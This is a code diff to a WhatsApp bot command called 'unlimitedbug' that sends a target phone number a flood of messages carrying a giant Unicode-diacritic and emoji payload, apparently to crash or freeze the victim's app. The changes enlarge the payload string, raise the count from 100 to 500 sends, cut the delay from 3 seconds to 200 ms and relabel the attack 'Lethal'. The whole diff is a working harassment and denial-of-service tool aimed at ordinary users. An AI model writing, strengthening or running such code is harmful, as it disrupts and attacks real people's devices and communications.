@@ -12,7 +12,7 @@ const isValidPhoneNumber = (number) => {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-const XEONTEXT3 = `𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃 ☠️̷⃨⃛꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨ` + "ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ".repeat(12000);
+const XEONTEXT3 = `𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃 ☠️̷⃨⃛꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨ` + "ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ".repeat(50000) + "⚰️".repeat(20000) + "⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟".repeat(10000);
 
 export default {
   name: 'unlimitedbug',
@@ -61,10 +61,10 @@ export default {
       await sock.sendMessage(from, { react: { text: '🔥', key: msg.key } });
 
       await sock.sendMessage(from, {
-        text: `🔥 *UNLIMITED BUG INITIATED*\n\n🎯 Target: +${clientNumber}\n💣 Type: Unlimited Scheduled Call\n📦 Payload: 201KB Arabic Diacritics\n⏳ Sending 100 payloads...`
+        text: `🔥 *ULTRA UNLIMITED BUG INITIATED*\n\n🎯 Target: +${clientNumber}\n💣 Type: Lethal Unlimited Scheduled Call\n📦 Payload: Massive Unicode & Diacritics\n⏳ Sending 500 payloads at high speed...`
       }, { quoted: msg });
 
-      const amount = 100;
+      const amount = 500;
       let successCount = 0;
 
       for (let i = 0; i < amount; i++) {
@@ -82,12 +82,10 @@ export default {
           });
           
           successCount++;
-          await sleep(3000);
+          await sleep(200);
           
-          if ((i + 1) % 20 === 0) {
-            await sock.sendMessage(from, {
-              text: `⏳ Progress: ${i + 1}/${amount} sent...`
-            }, { quoted: msg });
+          if ((i + 1) % 50 === 0) {
+            console.log(`[UNLIMITEDBUG] High Intensity Progress: ${i + 1}/${amount}`);
           }
         } catch (err) {
           console.log(`[UNLIMITEDBUG] Error on payload ${i + 1}: ${err.message}`);
